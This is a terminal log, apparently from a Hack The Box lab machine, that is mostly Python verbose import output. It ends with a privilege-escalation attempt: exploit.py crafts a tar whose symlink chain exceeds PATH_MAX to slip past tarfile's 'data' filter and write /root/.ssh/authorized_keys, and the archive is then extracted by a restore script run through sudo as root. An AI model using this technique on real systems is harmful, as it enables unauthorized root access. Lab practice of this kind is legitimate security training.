+# /usr/local/lib/python3.12/__pycache__/rlcompleter.cpython-312.pyc matches /usr/local/lib/python3.12/rlcompleter.py
+# code object from '/usr/local/lib/python3.12/__pycache__/rlcompleter.cpython-312.pyc'
+import 'atexit' # <class '_frozen_importlib.BuiltinImporter'>
+# /usr/local/lib/python3.12/__pycache__/inspect.cpython-312.pyc matches /usr/local/lib/python3.12/inspect.py
+# code object from '/usr/local/lib/python3.12/__pycache__/inspect.cpython-312.pyc'
+# /usr/local/lib/python3.12/__pycache__/ast.cpython-312.pyc matches /usr/local/lib/python3.12/ast.py
+# code object from '/usr/local/lib/python3.12/__pycache__/ast.cpython-312.pyc'
+# /usr/local/lib/python3.12/re/__pycache__/__init__.cpython-312.pyc matches /usr/local/lib/python3.12/re/__init__.py
+# code object from '/usr/local/lib/python3.12/re/__pycache__/__init__.cpython-312.pyc'
+# /usr/local/lib/python3.12/__pycache__/enum.cpython-312.pyc matches /usr/local/lib/python3.12/enum.py
+# code object from '/usr/local/lib/python3.12/__pycache__/enum.cpython-312.pyc'
+# /usr/local/lib/python3.12/__pycache__/types.cpython-312.pyc matches /usr/local/lib/python3.12/types.py
+# code object from '/usr/local/lib/python3.12/__pycache__/types.cpython-312.pyc'
+import 'types' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb6f980>
+# /usr/local/lib/python3.12/__pycache__/operator.cpython-312.pyc matches /usr/local/lib/python3.12/operator.py
+# code object from '/usr/local/lib/python3.12/__pycache__/operator.cpython-312.pyc'
+import '_operator' # <class '_frozen_importlib.BuiltinImporter'>
+import 'operator' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb6fbf0>
+# /usr/local/lib/python3.12/__pycache__/functools.cpython-312.pyc matches /usr/local/lib/python3.12/functools.py
+# code object from '/usr/local/lib/python3.12/__pycache__/functools.cpython-312.pyc'
+# /usr/local/lib/python3.12/collections/__pycache__/__init__.cpython-312.pyc matches /usr/local/lib/python3.12/collections/__init__.py
+# code object from '/usr/local/lib/python3.12/collections/__pycache__/__init__.cpython-312.pyc'
+import 'itertools' # <class '_frozen_importlib.BuiltinImporter'>
+# /usr/local/lib/python3.12/__pycache__/keyword.cpython-312.pyc matches /usr/local/lib/python3.12/keyword.py
+# code object from '/usr/local/lib/python3.12/__pycache__/keyword.cpython-312.pyc'
+import 'keyword' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb9f680>
+# /usr/local/lib/python3.12/__pycache__/reprlib.cpython-312.pyc matches /usr/local/lib/python3.12/reprlib.py
+# code object from '/usr/local/lib/python3.12/__pycache__/reprlib.cpython-312.pyc'
+import 'reprlib' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb9f950>
+import '_collections' # <class '_frozen_importlib.BuiltinImporter'>
+import 'collections' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb834a0>
+import '_functools' # <class '_frozen_importlib.BuiltinImporter'>
+import 'functools' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb80bc0>
+import 'enum' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb6cd40>
+# /usr/local/lib/python3.12/re/__pycache__/_compiler.cpython-312.pyc matches /usr/local/lib/python3.12/re/_compiler.py
+# code object from '/usr/local/lib/python3.12/re/__pycache__/_compiler.cpython-312.pyc'
+import '_sre' # <class '_frozen_importlib.BuiltinImporter'>
+# /usr/local/lib/python3.12/re/__pycache__/_parser.cpython-312.pyc matches /usr/local/lib/python3.12/re/_parser.py
+# code object from '/usr/local/lib/python3.12/re/__pycache__/_parser.cpython-312.pyc'
+# /usr/local/lib/python3.12/re/__pycache__/_constants.cpython-312.pyc matches /usr/local/lib/python3.12/re/_constants.py
+# code object from '/usr/local/lib/python3.12/re/__pycache__/_constants.cpython-312.pyc'
+import 're._constants' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbc2e70>
+import 're._parser' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbc1ac0>
+# /usr/local/lib/python3.12/re/__pycache__/_casefix.cpython-312.pyc matches /usr/local/lib/python3.12/re/_casefix.py
+# code object from '/usr/local/lib/python3.12/re/__pycache__/_casefix.cpython-312.pyc'
+import 're._casefix' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbc2ed0>
+import 're._compiler' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb81c10>
+# /usr/local/lib/python3.12/__pycache__/copyreg.cpython-312.pyc matches /usr/local/lib/python3.12/copyreg.py
+# code object from '/usr/local/lib/python3.12/__pycache__/copyreg.cpython-312.pyc'
+import 'copyreg' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbfc170>
+import 're' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb4bf80>
+import '_ast' # <class '_frozen_importlib.BuiltinImporter'>
+# /usr/local/lib/python3.12/__pycache__/contextlib.cpython-312.pyc matches /usr/local/lib/python3.12/contextlib.py
+# code object from '/usr/local/lib/python3.12/__pycache__/contextlib.cpython-312.pyc'
+import 'contextlib' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbfff80>
+import 'ast' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb3e7e0>
+# /usr/local/lib/python3.12/__pycache__/dis.cpython-312.pyc matches /usr/local/lib/python3.12/dis.py
+# code object from '/usr/local/lib/python3.12/__pycache__/dis.cpython-312.pyc'
+# /usr/local/lib/python3.12/__pycache__/opcode.cpython-312.pyc matches /usr/local/lib/python3.12/opcode.py
+# code object from '/usr/local/lib/python3.12/__pycache__/opcode.cpython-312.pyc'
+# extension module '_opcode' loaded from '/usr/local/lib/python3.12/lib-dynload/_opcode.cpython-312-x86_64-linux-gnu.so'
+# extension module '_opcode' executed from '/usr/local/lib/python3.12/lib-dynload/_opcode.cpython-312-x86_64-linux-gnu.so'
+import '_opcode' # <_frozen_importlib_external.ExtensionFileLoader object at 0x7f77fb9f81d0>
+import 'opcode' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9bf560>
+import 'dis' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb3fa40>
+# /usr/local/lib/python3.12/collections/__pycache__/abc.cpython-312.pyc matches /usr/local/lib/python3.12/collections/abc.py
+# code object from '/usr/local/lib/python3.12/collections/__pycache__/abc.cpython-312.pyc'
+import 'collections.abc' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9f9a30>
+# /usr/local/lib/python3.12/importlib/__pycache__/__init__.cpython-312.pyc matches /usr/local/lib/python3.12/importlib/__init__.py
+# code object from '/usr/local/lib/python3.12/importlib/__pycache__/__init__.cpython-312.pyc'
+# /usr/local/lib/python3.12/__pycache__/warnings.cpython-312.pyc matches /usr/local/lib/python3.12/warnings.py
+# code object from '/usr/local/lib/python3.12/__pycache__/warnings.cpython-312.pyc'
+import 'warnings' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9f94f0>
+import 'importlib' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9f9880>
+import 'importlib.machinery' # <class '_frozen_importlib.FrozenImporter'>
+# /usr/local/lib/python3.12/__pycache__/linecache.cpython-312.pyc matches /usr/local/lib/python3.12/linecache.py
+# code object from '/usr/local/lib/python3.12/__pycache__/linecache.cpython-312.pyc'
+# /usr/local/lib/python3.12/__pycache__/tokenize.cpython-312.pyc matches /usr/local/lib/python3.12/tokenize.py
+# code object from '/usr/local/lib/python3.12/__pycache__/tokenize.cpython-312.pyc'
+# /usr/local/lib/python3.12/__pycache__/token.cpython-312.pyc matches /usr/local/lib/python3.12/token.py
+# code object from '/usr/local/lib/python3.12/__pycache__/token.cpython-312.pyc'
+import 'token' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fba10e60>
+import '_tokenize' # <class '_frozen_importlib.BuiltinImporter'>
+import 'tokenize' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9fb9b0>
+import 'linecache' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9fb740>
+import 'inspect' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb01820>
+import 'rlcompleter' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb01280>
+Python 3.12.3 (main, Nov  3 2025, 09:30:32) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> exit()
+# clear sys.path_importer_cache
+# clear sys.path_hooks
+# clear builtins._
+# clear sys.path
+# clear sys.argv
+# clear sys.ps1
+# clear sys.ps2
+# clear sys.last_exc
+# clear sys.last_type
+# clear sys.last_value
+# clear sys.last_traceback
+# clear sys.__interactivehook__
+# clear sys.meta_path
+# restore sys.stdin
+# restore sys.stdout
+# restore sys.stderr
+# cleanup[2] removing sys
+# cleanup[2] removing builtins
+# cleanup[2] removing _frozen_importlib
+# cleanup[2] removing _imp
+# cleanup[2] removing _thread
+# cleanup[2] removing _warnings
+# cleanup[2] removing _weakref
+# cleanup[2] removing _io
+# cleanup[2] removing marshal
+# cleanup[2] removing posix
+# cleanup[2] removing _frozen_importlib_external
+# cleanup[2] removing time
+# cleanup[2] removing zipimport
+# destroy zipimport
+# cleanup[2] removing _codecs
+# cleanup[2] removing codecs
+# cleanup[2] removing encodings.aliases
+# cleanup[2] removing encodings
+# destroy encodings
+# cleanup[2] removing encodings.utf_8
+# cleanup[2] removing _signal
+# cleanup[2] removing _abc
+# cleanup[2] removing abc
+# cleanup[2] removing io
+# cleanup[2] removing __main__
+# cleanup[2] removing _stat
+# cleanup[2] removing stat
+# cleanup[2] removing _collections_abc
+# cleanup[2] removing genericpath
+# cleanup[2] removing posixpath
+# cleanup[2] removing os.path
+# cleanup[2] removing os
+# cleanup[2] removing _sitebuiltins
+# cleanup[2] removing site
+# destroy site
+# cleanup[2] removing readline
+# cleanup[2] removing atexit
+# cleanup[2] removing types
+# cleanup[2] removing _operator
+# cleanup[2] removing operator
+# destroy operator
+# cleanup[2] removing itertools
+# cleanup[2] removing keyword
+# cleanup[2] removing reprlib
+# destroy reprlib
+# cleanup[2] removing _collections
+# cleanup[2] removing collections
+# cleanup[2] removing _functools
+# cleanup[2] removing functools
+# cleanup[2] removing enum
+# cleanup[2] removing _sre
+# cleanup[2] removing re._constants
+# cleanup[2] removing re._parser
+# cleanup[2] removing re._casefix
+# cleanup[2] removing re._compiler
+# cleanup[2] removing copyreg
+# cleanup[2] removing re
+# cleanup[2] removing _ast
+# destroy _ast
+# cleanup[2] removing contextlib
+# destroy contextlib
+# cleanup[2] removing ast
+# cleanup[2] removing _opcode
+# cleanup[2] removing opcode
+# destroy opcode
+# cleanup[2] removing dis
+# cleanup[2] removing collections.abc
+# cleanup[2] removing importlib._bootstrap
+# cleanup[2] removing importlib._bootstrap_external
+# cleanup[2] removing warnings
+# cleanup[2] removing importlib
+# cleanup[2] removing importlib.machinery
+# cleanup[2] removing token
+# cleanup[2] removing _tokenize
+# cleanup[2] removing tokenize
+# cleanup[2] removing linecache
+# cleanup[2] removing inspect
+# cleanup[2] removing rlcompleter
+# destroy rlcompleter
+# destroy time
+# destroy _signal
+# destroy _sitebuiltins
+# destroy inspect
+# destroy keyword
+# destroy __main__
+# destroy atexit
+# destroy ast
+# destroy dis
+# destroy importlib
+# destroy linecache
+# destroy token
+# destroy types
+# destroy io
+# destroy _opcode
+# destroy warnings
+# destroy importlib.machinery
+# destroy tokenize
+# destroy collections
+# destroy _tokenize
+# cleanup[3] wiping importlib._bootstrap_external
+# cleanup[3] wiping importlib._bootstrap
+# destroy _frozen_importlib_external
+# cleanup[3] wiping collections.abc
+# cleanup[3] wiping re
+# destroy re._constants
+# destroy re._casefix
+# destroy re._compiler
+# destroy enum
+# destroy functools
+# destroy copyreg
+# cleanup[3] wiping re._parser
+# cleanup[3] wiping _sre
+# cleanup[3] wiping _functools
+# cleanup[3] wiping _collections
+# cleanup[3] wiping itertools
+# cleanup[3] wiping _operator
+# cleanup[3] wiping readline
+# cleanup[3] wiping os
+# destroy posixpath
+# cleanup[3] wiping genericpath
+# cleanup[3] wiping _collections_abc
+# cleanup[3] wiping stat
+# cleanup[3] wiping _stat
+# destroy _stat
+# cleanup[3] wiping abc
+# cleanup[3] wiping _abc
+# cleanup[3] wiping encodings.utf_8
+# cleanup[3] wiping encodings.aliases
+# cleanup[3] wiping codecs
+# cleanup[3] wiping _codecs
+# cleanup[3] wiping posix
+# cleanup[3] wiping marshal
+# destroy marshal
+# cleanup[3] wiping _io
+# cleanup[3] wiping _weakref
+# cleanup[3] wiping _warnings
+# destroy _warnings
+# cleanup[3] wiping _thread
+# cleanup[3] wiping _imp
+# destroy _imp
+# cleanup[3] wiping _frozen_importlib
+# cleanup[3] wiping sys
+# cleanup[3] wiping builtins
+# destroy readline
+# destroy sys.monitoring
+# destroy _io
+# destroy re._parser
+# destroy stat
+# destroy genericpath
+# destroy posix
+# clear sys.meta_path
+# clear sys.modules
+# destroy _frozen_importlib
+# destroy codecs
+# destroy encodings.aliases
+# destroy encodings.utf_8
+# destroy _codecs
+# destroy re
+# destroy abc
+# destroy os
+# destroy _sre
+# destroy _abc
+# destroy _collections_abc
+# destroy sys
+# destroy _operator
+# destroy _weakref
+# destroy _collections
+# destroy collections.abc
+# destroy builtins
+# destroy itertools
+# destroy _functools
+# destroy _thread
+# clear sys.audit hooks
+wacky@wingdata:/opt/backup_clients/backups$ python3 --version
+Python 3.12.3
+wacky@wingdata:/opt/backup_clients/backups$ rm exploit.py 
+wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
+wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py
+[*] Destination directory length: 28
+[*] Component length: 239
+[*] Estimated resolved path length: 4108
+[*] PATH_MAX: 4096
+
+[+] Created 16 directory/symlink pairs
+[+] Created 254-char escaping symlink (target: ../../../../../../../../../../../../../../../../)
+[+] Created 'escape' symlink (depth to root: 3)
+[+] Added payload file: escape/root/.ssh/authorized_keys
+
+[*] Created backup_1001.tar
+[*] Target file on extraction: /root/.ssh/authorized_keys
+
+[!] Transfer this tar to the target and trigger extraction
+[!] via the vulnerable Python script using filter='data'
+wacky@wingdata:/opt/backup_clients/backups$ ls
+backup_1001.tar  backup_9999.tar  check.py  exploit.py
+wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+[+] Backup: backup_1001.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn
+wacky@wingdata:/opt/backup_clients/backups$ ls /opt
+backup_clients  root  wftpserver
+wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
+wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py 
+[*] Destination directory length: 28
+[*] Component length: 239
+[*] Estimated resolved path length: 4108
+[*] PATH_MAX: 4096
+
+[+] Created 16 directory/symlink pairs
+[+] Created 254-char escaping symlink (target: ../../../../../../../../../../../../../../../../)
+[+] Created 'escape' symlink (depth to root: 4)
+[+] Added payload file: escape/root/.ssh/authorized_keys
+
+[*] Created backup_1001.tar
+[*] Target file on extraction: /root/.ssh/authorized_keys
+
+[!] Transfer this tar to the target and trigger extraction
+[!] via the vulnerable Python script using filter='data'
+wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
+[+] Backup: backup_1001.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn
+wacky@wingdata:/opt/backup_clients/backups$ Read from remote host wingdata.htb: Connection timed out
+Connection to wingdata.htb closed.
+client_loop: send disconnect: Broken pipe
+                                                            
+
